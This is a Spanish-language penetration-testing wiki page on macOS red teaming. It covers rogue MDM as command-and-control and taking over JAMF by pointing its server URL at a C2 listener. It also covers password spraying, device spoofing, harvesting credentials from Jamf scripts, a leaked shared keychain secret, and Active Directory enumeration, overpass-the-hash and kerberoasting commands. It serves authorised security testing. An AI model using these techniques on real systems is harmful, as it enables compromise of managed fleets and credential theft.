# Red Teaming de macOS

{{#include ../../banners/hacktricks-training.md}}


## Abuso de MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Si consigues **comprometer credenciales de administrador** para acceder a la plataforma de gestión, podrías **comprometer potencialmente todos los equipos** distribuyendo malware en ellos.

Para hacer Red Teaming en entornos MacOS, se recomienda encarecidamente entender cómo funcionan los MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Usar MDM como C2

Un MDM tendrá permiso para instalar, consultar o eliminar perfiles, instalar aplicaciones, crear cuentas de administrador local, establecer la contraseña del firmware, cambiar la clave de FileVault...

Para ejecutar tu propio MDM, necesitas que **un proveedor firme tu CSR**. Puedes intentar conseguirlo en [**https://mdmcert.download/**](https://mdmcert.download/). Para ejecutar tu propio MDM en dispositivos Apple, puedes usar [**MicroMDM**](https://github.com/micromdm/micromdm).

La inscripción en un MDM **no** convierte automáticamente el certificado TLS del servidor de gestión en una CA de confianza ni otorga una identidad para firmar aplicaciones. Si el servidor usa una CA privada, sus certificados raíz e intermedios deben incluirse en el perfil de inscripción o en un perfil de confianza independiente. La identidad de cliente que se usa para la autenticación MDM es un certificado distinto.<sup>[[7]](#references)</sup>

Un perfil de inscripción MDM descargado (`.mobileconfig`) debe abrirse y aprobarse en **Ajustes del Sistema → General → Gestión de dispositivos**. Simplemente incluirlo en un `.pkg` instalado como root o en un ZIP abierto en Safari no inscribe silenciosamente un Mac actual. Consulta [el comportamiento de los perfiles de configuración](../macos-auto-start-locations.md#configuration-profiles-mobileconfig).<sup>[[8]](#references)</sup>

La inscripción automatizada de dispositivos durante el Asistente de Configuración es un flujo independiente. Consulta [la inscripción fraudulenta de un dispositivo de otra organización](macos-mdm/enrolling-devices-in-other-organisations.md) para conocer sus distintos requisitos.<sup>[[9]](#references)</sup>

**El agente Orthrus de Mythic** usa esta técnica.

### Implementar un paquete mediante un MDM controlado

En un **Mac supervisado con macOS 26 o posterior**, el control del servicio MDM permite usar una declaración `com.apple.configuration.package` en el ámbito del sistema.<sup>[[10]](#references)</sup> El paquete debe tener una firma que el dispositivo pueda verificar, pero su aplicación no necesita una firma Developer ID independiente: Gatekeeper no comprueba las aplicaciones instaladas mediante la gestión de dispositivos.<sup>[[11]](#references)</sup> Un certificado TLS de servidor de confianza no otorga por sí solo al operador la clave privada ni el uso de firma necesarios para firmar ese paquete.<sup>[[11]](#references)[[12]](#references)</sup>

Crea un paquete de prueba firmado, calcula su digest y publica el paquete y un plist `ManifestURL` mediante HTTPS. El manifiesto necesita un recurso `software-package` con su URL y SHA-256, además de un `bundle-identifier` y un `bundle-version` únicos.<sup>[[11]](#references)</sup> Después, envía una declaración de paquete con la URL del manifiesto y establece `InstallBehavior.Install` en `Required`; comprueba el elemento de estado `package.list` para verificar la instalación o detectar errores.<sup>[[10]](#references)[[11]](#references)</sup>

### References

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

Una declaración mínima de instalación obligatoria, enviada a través del servicio MDM, tiene este aspecto (sustituye la URL y ambos UUID).<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### Abuso de JAMF PRO

JAMF puede ejecutar **scripts personalizados** (scripts desarrollados por el administrador de sistemas), **payloads nativos** (creación de cuentas locales, establecimiento de contraseña EFI, monitorización de archivos/procesos...) y **MDM** (configuraciones de dispositivos, certificados de dispositivos...).<sup>[[5]](#references)</sup>

#### Autoinscripción en JAMF

Ve a una página como `https://<company-name>.jamfcloud.com/enroll/` para comprobar si tienen habilitada la **autoinscripción**. Si la tienen, puede que **solicite credenciales para acceder**.

Podrías usar el script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) para realizar un ataque de password spraying.

Además, después de encontrar credenciales válidas, podrías hacer brute-force de otros nombres de usuario con el siguiente formulario:

![Abuso de JAMF PRO - Autoinscripción en JAMF: Además, después de encontrar credenciales válidas, podrías hacer brute-force de otros nombres de usuario con el siguiente formulario](<../../images/image (107).png>)

#### Autenticación de dispositivos JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

El binario **`jamf`** contenía el secreto para abrir el keychain, que en el momento del descubrimiento era **compartido** por todos y era: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Además, jamf persiste como **LaunchDaemon** en **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Toma de control de dispositivos JAMF

La **URL** del **JSS** (Jamf Software Server) que usará **`jamf`** se encuentra en **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Este archivo básicamente contiene la URL:

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

Así, un atacante podría dejar un paquete malicioso (`pkg`) que, al instalarse, **sobrescriba este archivo** y establezca la **URL de un listener de Mythic C2 desde un agente Typhon**, para poder abusar de JAMF como C2.

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### Suplantación de JAMF

Para **suplantar la comunicación** entre un dispositivo y JMF, necesitas:

- El **UUID** del dispositivo: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- El **keychain de JAMF** de: `/Library/Application\ Support/Jamf/JAMF.keychain`, que contiene el certificado del dispositivo

Con esta información, **crea una VM** con el **UUID** de hardware **robado** y con **SIP desactivado**, coloca el **keychain de JAMF**, haz **hook** del **agent** de Jamf y roba su información.

#### Robo de secretos

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

También podrías monitorizar la ubicación `/Library/Application Support/Jamf/tmp/` para detectar los **custom scripts** que los administradores podrían querer ejecutar mediante Jamf, ya que **se colocan aquí, se ejecutan y se eliminan**. Estos scripts **podrían contener credenciales**.

Sin embargo, las **credenciales** podrían pasarse a estos scripts como **parámetros**, por lo que tendrías que monitorizar `ps aux | grep -i jamf` (sin necesidad de ser root).

El script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) puede escuchar si se añaden archivos nuevos y detectar argumentos de procesos nuevos.

### Acceso remoto de macOS

Y también sobre los **protocolos** de **red** "especiales" de **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

En algunas ocasiones descubrirás que el **equipo MacOS está conectado a un AD**. En este escenario, deberías intentar **enumerar** el active directory como acostumbras. Puedes encontrar **ayuda** en las siguientes páginas:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Una **herramienta local de MacOS** que también podría ayudarte es `dscl`:

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

También hay algunas herramientas preparadas para MacOS que permiten enumerar automáticamente AD e interactuar con kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound es una extensión de la herramienta de auditoría Bloodhound que permite recopilar e ingerir relaciones de Active Directory en hosts MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost es un proyecto Objective-C diseñado para interactuar con las API de Heimdal krb5 en macOS. El objetivo del proyecto es permitir realizar mejores pruebas de seguridad relacionadas con Kerberos en dispositivos macOS mediante API nativas, sin requerir ningún otro framework o paquete en el objetivo.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Herramienta JavaScript for Automation (JXA) para enumerar Active Directory.

### Información del dominio

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Usuarios

Los tres tipos de usuarios de MacOS son:

- **Usuarios locales** — Administrados por el servicio OpenDirectory local, no están conectados de ninguna manera a Active Directory.
- **Usuarios de red** — Usuarios volátiles de Active Directory que requieren una conexión al servidor DC para autenticarse.
- **Usuarios móviles** — Usuarios de Active Directory con una copia de seguridad local de sus credenciales y archivos.

La información local sobre usuarios y grupos se almacena en la carpeta _/var/db/dslocal/nodes/Default._\
Por ejemplo, la información sobre el usuario llamado _mark_ se almacena en _/var/db/dslocal/nodes/Default/users/mark.plist_ y la información sobre el grupo _admin_ está en _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Además de usar las relaciones HasSession y AdminTo, **MacHound añade tres relaciones nuevas** a la base de datos de Bloodhound:<sup>[[2]](#references)</sup>

- **CanSSH** - entidad autorizada a usar SSH para conectarse al host
- **CanVNC** - entidad autorizada a usar VNC para conectarse al host
- **CanAE** - entidad autorizada a ejecutar scripts AppleEvent en el host

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

Más información en [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Contraseña de Computer$

Obtén contraseñas mediante:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

Es posible acceder a la contraseña de **`Computer$`** dentro del llavero del sistema.

### Over-Pass-The-Hash

Obtener un TGT para un usuario y servicio específicos:

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Una vez recopilado el TGT, es posible inyectarlo en la sesión actual con:

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Con los tickets de servicio obtenidos, es posible intentar acceder a shares en otros equipos:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Acceso al Keychain

Es muy probable que el Keychain contenga información confidencial que, si se accede a ella sin generar un prompt, podría ayudar a avanzar en un ejercicio de red team:


{{#ref}}
macos-keychain.md
{{#endref}}

## Servicios externos

El Red Teaming en MacOS es diferente al Red Teaming habitual en Windows, ya que **MacOS suele estar integrado directamente con varias plataformas externas**. Una configuración habitual de MacOS permite acceder al equipo con **credenciales sincronizadas de OneLogin y acceder a varios servicios externos** (como github, aws...) mediante OneLogin.

## Técnicas diversas de Red Team

### Safari

Cuando se descarga un archivo en Safari, si es un archivo «seguro», se **abre automáticamente**. Por ejemplo, si **descargas un zip**, se descomprime automáticamente:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [A recoger manzanas: Red Teaming en entornos MacOS en 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Presentamos MacHound: una solución para ataques basados en Active Directory en macOS](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Comandos de enumeración de dominios (equivalentes de dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Ven al lado oscuro, tenemos manzanas: convertir la gestión de macOS en algo malicioso](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: «Una perspectiva del atacante sobre las configuraciones de Jamf» - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Descubrimiento de Active Directory con un Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — Gestión de certificados para servicios y dispositivos de gestión de dispositivos](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Usar perfiles de configuración en Mac](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — Implementación de perfiles de inscripción para la gestión de dispositivos](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — Declaración de paquetes](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — Instalación de paquetes](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — Identidades](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
